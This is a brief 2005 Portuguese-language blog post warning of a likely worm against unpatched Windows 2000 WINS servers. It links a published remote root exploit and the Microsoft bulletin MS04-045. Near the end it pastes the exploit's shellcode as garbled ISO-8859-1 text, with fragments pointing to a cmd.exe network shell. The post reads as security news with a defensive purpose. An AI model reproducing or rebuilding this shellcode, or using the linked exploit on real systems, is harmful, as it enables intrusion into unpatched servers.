---
title: 'Em breve: worm contra WINS'
date: 2005-01-02T21:23:00.000-08:00
draft: false
url: /2005/01/em-breve-worm-contra-wins.html
---

Se o exploit que acabo de ver publicado não é fake (ver nota abaixo), o Pai Dinah aqui prevê um worm que vai pegar os servidores win2k não atualizados.  
  
O código foi publicado em [http://www.k-otik.com/exploits/20041231.ZUC-WINShit.c.php](http://www.k-otik.com/exploits/20041231.ZUC-WINShit.c.php) e recebeu a descrição "ZUCWins 0.1 - Wins 2000 remote root exploit". Admins competentes nem precisarão [verificar](http://www.microsoft.com/technet/security/bulletin/MS04-045.mspx) seus servidores rodando WINS, já que foram atualizados em dezembro.  
  
Nota: Não testei o exploit, mas aparentemente não é fake. A título de curiosidade e pra fingir que eu entendo um código compilado só de abri-lo no notepad, o shellcode a ser executado, quando codificado em ISO-8859-1, é:  

> ë%éú™Ówö��lYlYø�œÞŒÑLpÔ�XFWS2\_32.DLL�ë�èùÿÿÿ\]ƒí,j0Yd‹�‹@  
> ‹p�­‹x�\_<‹��û‹\[x�û‹K��ù‹S$�úSQR‹\[ �û1ÉA1À™‹4‹�þ¬1ÂÑâ„Àu÷�¶E DE�f9�uáf1�ZX^VPR+N�A�· J‹�ˆ�ø�¶M ‰DØþM u¾þM�t�þM$\]�SÿÐ‰Çj�XˆE €Ey ë‚P‹E�5““““‰E�f‹E�f5““f‰E�X‰Î1ÛSSSSVFVÿÐ‰ÇUXf‰0j�UWÿUàEˆPÿUèUUÿUìD� ”Sh.exeh\\cmd”1ÒEÌ”WWWSSþÊ�òR”ExPEˆP±�SSj�þÎRSSSUÿUðjÿÿUä